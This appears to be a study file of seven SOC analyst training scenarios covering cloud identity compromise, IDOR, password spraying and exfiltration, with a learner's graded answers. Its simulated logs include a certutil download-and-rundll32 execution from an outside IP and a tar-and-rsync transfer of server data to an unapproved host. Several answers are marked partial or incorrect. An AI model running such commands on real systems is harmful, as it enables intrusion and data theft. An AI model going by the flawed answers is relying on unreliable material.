@@ -1,0 +1,542 @@
+{
+  "id": "009",
+  "title": "Realistic Hands-On SOC Scenarios",
+  "date": "2026-06-11",
+  "status": "Raw Answers",
+  "summary": "7 realistic hands-on CySA+ / SOC analyst scenarios focused on cloud identity compromise, remote management tool abuse, cloud storage/DLP policy violations, API authorization flaws, Active Directory credential abuse, Linux data exfiltration, and vulnerability prioritization under business pressure.",
+  "questions": [],
+  "scenarios": [
+    {
+      "id": 1,
+      "title": "Microsoft 365 Mailbox Access After Travel",
+      "category": "Cloud / Identity",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A finance employee returned from a business trip two days ago.",
+            "The employee normally works from Vilnius but recently used hotel Wi-Fi and airport Wi-Fi."
+          ]
+        },
+        {
+          "title": "Microsoft 365 Sign-in Logs",
+          "items": [
+            "08:12 UTC — Successful login from Vilnius, Lithuania",
+            "08:19 UTC — Successful login from Amsterdam, Netherlands",
+            "08:24 UTC — Successful login from Vilnius, Lithuania",
+            "MFA result: satisfied by previously registered method",
+            "Client app: Browser",
+            "Conditional Access: Passed",
+            "Device compliance: Unknown",
+            "Session ID reused across multiple requests"
+          ]
+        },
+        {
+          "title": "Mailbox Audit",
+          "items": [
+            "SearchQuery initiated: subject:\"invoice\" OR subject:\"payment\" OR subject:\"wire\"",
+            "312 messages accessed in 11 minutes",
+            "Inbox rule created: Name: \"Archive processed\"",
+            "Rule condition: sender contains \"vendor\"",
+            "Rule action: move to folder \"RSS Feeds\"",
+            "Forwarding is not enabled"
+          ]
+        },
+        {
+          "title": "Defender for Cloud Apps",
+          "items": [
+            "OAuth app consent granted: PDF Invoice Preview",
+            "Permissions: Mail.Read, offline_access",
+            "Publisher: Unverified",
+            "Consent type: User consent"
+          ]
+        },
+        {
+          "title": "Helpdesk Ticket",
+          "items": [
+            "The user says: \"I did open a PDF preview page from an invoice email yesterday, but I changed my password this morning.\""
+          ]
+        }
+      ],
+      "tasks": [
+        "What are the most likely explanations for the activity? List at least two possibilities.",
+        "Which evidence points toward compromise instead of normal travel?",
+        "Why might the password change not stop the suspicious access?",
+        "What should be revoked or disabled first?",
+        "Which logs would you review next to confirm mailbox impact?",
+        "What would you tell the user or helpdesk to avoid destroying evidence?",
+        "Suggest one detection rule idea for this scenario."
+      ],
+      "myAnswers": [
+        {
+          "answer": "I see only token hijack with unauthorized account access, i would have said maybe normal activity but it looks very suspicious, not normal",
+          "review": "partial"
+        },
+        {
+          "answer": "Impossible travel, accessing a lot of messages in small amount of time, pdf page opened from invoice email",
+          "review": "partial"
+        },
+        {
+          "answer": "Because password change doesn't affect token compromise",
+          "review": "correct"
+        },
+        {
+          "answer": "Account should be locked or revoked from privileges, and there should be further investigation, particularly on possible token hijack",
+          "review": "partial"
+        },
+        {
+          "answer": "IP address during suspicious login, Defender for cloud apps logs.",
+          "review": "partial"
+        },
+        {
+          "answer": "Deleting account or removing any evidence like login logs",
+          "review": "partial"
+        },
+        {
+          "answer": "IF impossible travel login attempt in short amount of time AND suspicious activity (accessing a lot of messages, creating new rules) THEN revoke privileges and lock the account + extract logs",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 2,
+      "title": "EDR Alert or IT Admin Tool Misuse",
+      "category": "Endpoint / EDR",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A software deployment team uses remote management tools to update workstations after hours.",
+            "One endpoint, WS-117, triggered several EDR alerts during the same maintenance window."
+          ]
+        },
+        {
+          "title": "EDR Process Tree",
+          "items": [
+            "C:\\Program Files\\RemoteAssist\\ra_service.exe",
+            "Child process: C:\\Windows\\System32\\cmd.exe /c whoami",
+            "Child process: powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\update_check.ps1",
+            "certutil.exe -urlcache -split -f http://185.199.108.90/win.dat C:\\ProgramData\\win.dat",
+            "rundll32.exe C:\\ProgramData\\win.dat,Start"
+          ]
+        },
+        {
+          "title": "File Details",
+          "items": [
+            "win.dat has no vendor signature",
+            "Hash is unknown in VirusTotal",
+            "File was created only on WS-117",
+            "RemoteAssist binary is signed and used in the company"
+          ]
+        },
+        {
+          "title": "Network",
+          "items": [
+            "WS-117 connected to 185.199.108.90:80",
+            "Then connected to 45.83.12.44:443 every 90 seconds",
+            "No proxy category reputation available for 45.83.12.44"
+          ]
+        },
+        {
+          "title": "Admin Chat",
+          "items": [
+            "A deployment engineer says: \"We did push updates last night, but I don't recognize win.dat or that IP.\""
+          ]
+        }
+      ],
+      "tasks": [
+        "What is the most likely security concern?",
+        "What evidence could still be legitimate admin activity?",
+        "What evidence makes it suspicious despite the signed remote tool?",
+        "What should be contained first: the host, the remote tool, the admin account, or the IP? Explain."
+      ],
+      "myAnswers": [
+        {
+          "answer": "Possible machine compromise and persistence established, powershell command execution",
+          "review": "correct"
+        },
+        {
+          "answer": "update_check.ps1, recent updates done, RemoteAssist binary is signed",
+          "review": "correct"
+        },
+        {
+          "answer": "Powershell command execution bypassing policy, connection to external ip and timed connection to other external ip, indicating possible C2",
+          "review": "correct"
+        },
+        {
+          "answer": "The host, because tool was just a way to gain foothold in machine, containing admin account wouldn't do much, so the best decision is to contain and isolate the host, collect logs and investigate.",
+          "review": "correct"
+        }
+      ]
+    },
+    {
+      "id": 3,
+      "title": "Cloud Storage Data Access Without Malware",
+      "category": "Insider Threat / DLP",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A product manager has access to customer research documents.",
+            "DLP alerts triggered after unusual cloud storage activity."
+          ]
+        },
+        {
+          "title": "CASB / Cloud Logs",
+          "items": [
+            "User: lina.p@company.example",
+            "Source IP: normal corporate VPN range",
+            "Device: personal laptop, not managed by MDM",
+            "Downloaded 4.8GB from SharePoint folder: /ProductStrategy/2027-Roadmap/",
+            "Uploaded 4.6GB to: https://drive-storage-personal.example/upload",
+            "Activity started at 22:41 local time",
+            "User authenticated successfully with MFA"
+          ]
+        },
+        {
+          "title": "HR Context",
+          "items": [
+            "User is moving to another internal team in two weeks",
+            "No resignation submitted",
+            "Manager says the user is preparing a handover",
+            "The destination cloud service is not approved for company data"
+          ]
+        },
+        {
+          "title": "Endpoint Context",
+          "items": [
+            "No EDR agent installed because device is personal/BYOD",
+            "No malware indicators available",
+            "User claims: \"I needed the files at home because SharePoint was slow.\""
+          ]
+        }
+      ],
+      "tasks": [
+        "What are the main possible explanations?",
+        "Why is this not automatically proof of malicious insider theft?",
+        "Why is it still a security incident or policy violation?",
+        "What should analysts verify before disabling the account?"
+      ],
+      "myAnswers": [
+        {
+          "answer": "Legitimate activity however violating company's policy because destination cloud service was not approved for company data",
+          "review": "partial"
+        },
+        {
+          "answer": "Because there is no real indicators of malicious activity like impossible travel, multiple failed logins, unusual behavior",
+          "review": "partial"
+        },
+        {
+          "answer": "Because user was not allowed to store company data in un-approved service",
+          "review": "correct"
+        },
+        {
+          "answer": "Verify if there was no other data accessed",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 4,
+      "title": "API Authorization Abuse / IDOR",
+      "category": "Web Application Security",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A customer support portal uses an API endpoint to retrieve ticket attachments.",
+            "The WAF has no SQL injection alerts, but customers report seeing files that do not belong to them."
+          ]
+        },
+        {
+          "title": "Web/API Logs",
+          "items": [
+            "10.4.8.22 user_id=884 GET /api/tickets/88421/attachment/1 HTTP 200",
+            "10.4.8.22 user_id=884 GET /api/tickets/88422/attachment/1 HTTP 403",
+            "10.4.8.22 user_id=884 GET /api/tickets/88423/attachment/1 HTTP 200",
+            "10.4.8.22 user_id=884 GET /api/tickets/88424/attachment/1 HTTP 200",
+            "10.4.8.22 user_id=884 GET /api/tickets/88425/attachment/1 HTTP 403"
+          ]
+        },
+        {
+          "title": "Application Notes",
+          "items": [
+            "Ticket IDs are sequential",
+            "Authentication is required",
+            "Authorization checks are handled by backend logic",
+            "No obvious SQL injection, XSS, or command injection payloads",
+            "Rate limit did not trigger because requests were slow"
+          ]
+        },
+        {
+          "title": "Customer Report",
+          "items": [
+            "A customer says: \"I changed one number in the URL and opened someone else's attachment.\""
+          ]
+        }
+      ],
+      "tasks": [
+        "What vulnerability class is most likely?",
+        "Why would a WAF miss this?",
+        "What evidence supports authorization abuse rather than injection?",
+        "What should be done first to reduce exposure?",
+        "Which logs or database fields would help determine impacted customers?"
+      ],
+      "myAnswers": [
+        {
+          "answer": "Path traversal, it allows users to access data they weren't allowed to",
+          "review": "partial"
+        },
+        {
+          "answer": "Because it's not an intrusion or attack, most likely caused due to lack of input sanitization, code flaw",
+          "review": "partial"
+        },
+        {
+          "answer": "Slow requests, no obvious malicious payloads, authentication is required",
+          "review": "correct"
+        },
+        {
+          "answer": "Fix the code long-term, or disable feature to access anything for anybody short-term",
+          "review": "correct"
+        },
+        {
+          "answer": "GET requests and requested data user id",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 5,
+      "title": "AD Password Spraying or Broken Service",
+      "category": "Active Directory / Credential Attacks",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A SIEM correlation rule triggered for failed logins across many users.",
+            "The source is an internal application server, APP-03."
+          ]
+        },
+        {
+          "title": "Windows Security Logs",
+          "items": [
+            "4625 failed logon events against 146 users over 3 hours",
+            "Failure reason: bad password",
+            "Logon Type: 3",
+            "Source: APP-03",
+            "Authentication package: NTLM",
+            "Attempts occur every 75 seconds",
+            "One account, svc_reports, succeeds after several failures",
+            "Event ID 4672 occurs for svc_reports on FILE-02",
+            "Shortly after, FILE-02 logs access to \\\\FILE-02\\C$"
+          ]
+        },
+        {
+          "title": "Application Team",
+          "items": [
+            "APP-03 runs an old reporting app using stored credentials.",
+            "The team says: \"The app sometimes fails when the password expires.\""
+          ]
+        },
+        {
+          "title": "Additional Context",
+          "items": [
+            "svc_reports should only read reports from SQL-02",
+            "svc_reports should not access FILE-02 admin shares",
+            "No approved change window occurred"
+          ]
+        }
+      ],
+      "tasks": [
+        "What are the possible benign and malicious explanations?",
+        "Which detail makes this more serious than a broken application password?",
+        "What should be investigated first?",
+        "What containment action would reduce risk without breaking everything immediately?",
+        "Which accounts and hosts should be scoped?"
+      ],
+      "myAnswers": [
+        {
+          "answer": "Password spraying or credential stuffing, then priv esc, then root level access. Reporting app most likely resets expired passwords to weak ones or default",
+          "review": "partial"
+        },
+        {
+          "answer": "Reporting app stores credentials, meaning all users can be affected",
+          "review": "incorrect"
+        },
+        {
+          "answer": "The logic behind handling of expired password accounts by app",
+          "review": "partial"
+        },
+        {
+          "answer": "Disabling app's expired password handling (not sure, maybe disabling login possibility but it would mean more serious downtime, maybe disabling APP-03 for now).",
+          "review": "partial"
+        },
+        {
+          "answer": "APP-03, accessed accounts after server failures",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 6,
+      "title": "Linux Server Exfil or Legitimate Backup",
+      "category": "Linux Security / Data Exfiltration",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "A Linux web server hosts internal reports.",
+            "Network monitoring flagged a large outbound transfer late at night."
+          ]
+        },
+        {
+          "title": "Linux auth.log",
+          "items": [
+            "Jun 10 01:12:44 web-02 sshd[1833]: Accepted publickey for deploy from 10.0.6.12 port 52218 ssh2",
+            "Jun 10 01:14:02 web-02 sudo: deploy : TTY=pts/0 ; PWD=/srv/reports ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/reports_june.tar.gz /srv/reports",
+            "Jun 10 01:18:27 web-02 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /tmp/reports_june.tar.gz backup@203.0.113.88:/incoming/"
+          ]
+        },
+        {
+          "title": "Cron",
+          "items": [
+            "/etc/cron.d/nightly-report-sync exists",
+            "The cron job normally runs at 03:00, not 01:18",
+            "The destination in the cron job is backup@10.0.9.40:/backup/reports/"
+          ]
+        },
+        {
+          "title": "NetFlow",
+          "items": [
+            "src=web-02 dst=203.0.113.88 dst_port=22 bytes_out=2800000000 bytes_in=64000 duration=980"
+          ]
+        },
+        {
+          "title": "Admin Context",
+          "items": [
+            "The deploy user belongs to the web deployment group.",
+            "The backup vendor says 203.0.113.88 is not their address."
+          ]
+        }
+      ],
+      "tasks": [
+        "What is the most likely concern?",
+        "What could make this look like legitimate admin or backup activity?",
+        "Which evidence makes it suspicious?",
+        "What should be preserved before deleting files or killing sessions?"
+      ],
+      "myAnswers": [
+        {
+          "answer": "Most likely data exfil, legitimate activity is very unlikely here because of several suspicious events",
+          "review": "correct"
+        },
+        {
+          "answer": "This could be legitimate admin or backup activity if it was at a dedicated time and to a dedicated backup address",
+          "review": "correct"
+        },
+        {
+          "answer": "Unusual time, suspicious backup address",
+          "review": "partial"
+        },
+        {
+          "answer": "Logs, activity artifacts like commands, data traffic",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 7,
+      "title": "Vulnerability Prioritization Under Pressure",
+      "category": "Vulnerability Management",
+      "status": "Raw Answer",
+      "sections": [
+        {
+          "title": "Background",
+          "items": [
+            "Leadership wants all \"critical\" vulnerabilities patched immediately.",
+            "Operations says some systems cannot be patched this week."
+          ]
+        },
+        {
+          "title": "Vulnerability A",
+          "items": [
+            "Internet-facing VPN appliance",
+            "CVSS: 9.8",
+            "Public exploit available",
+            "Exploitation observed in the wild",
+            "Device provides remote access for employees",
+            "Patch available"
+          ]
+        },
+        {
+          "title": "Vulnerability B",
+          "items": [
+            "Internal database server",
+            "CVSS: 8.6",
+            "Contains sensitive customer data",
+            "No public exploit",
+            "Requires authenticated network access",
+            "Patch requires 4 hours downtime"
+          ]
+        },
+        {
+          "title": "Vulnerability C",
+          "items": [
+            "Public marketing website",
+            "CVSS: 9.1",
+            "Vulnerable component exposed only on admin panel",
+            "Admin panel restricted by IP allowlist",
+            "WAF rule available",
+            "Patch available next week"
+          ]
+        },
+        {
+          "title": "Vulnerability D",
+          "items": [
+            "Legacy manufacturing workstation",
+            "CVSS: 7.5",
+            "No patch available",
+            "Controls physical process equipment",
+            "Network segmented but monitoring is weak",
+            "Vendor recommends disabling SMBv1 but app team says it may break production"
+          ]
+        }
+      ],
+      "tasks": [
+        "Which vulnerability should be prioritized first and why?",
+        "Which vulnerability needs compensating controls instead of normal patching?",
+        "Which vulnerability may have a lower immediate risk than its CVSS suggests?",
+        "What additional business context would you ask for?",
+        "What should be done if patching the VPN appliance fails?"
+      ],
+      "myAnswers": [
+        {
+          "answer": "I would say either A or D, i think A, because D is exploitable but network is segmented, even if monitoring is weak. While A has an actively exploitable high CVSS rating vulnerability and provides remote access for employees, meaning if exploited it would mean probably lateral movement or priv esc. B contains sensitive info but no exploit available and authenticated access required, C is hard to exploit and doesn't have any sensitive info, at least from the description.",
+          "review": "correct"
+        },
+        {
+          "answer": "D, because there is no patch available. I would say segmentation is the best decision",
+          "review": "correct"
+        },
+        {
+          "answer": "C, because it's too hard to exploit and patch available soon",
+          "review": "correct"
+        },
+        {
+          "answer": "How much sensitive data is stored on B internal db server, is it PI, what kind of security training do employees go through, and how costly is it to replace legacy system",
+          "review": "partial"
+        },
+        {
+          "answer": "Finding an alternative to current VPN appliance, maybe other VPN service or platform",
+          "review": "partial"
+        }
+      ]
+    }
+  ]
+}
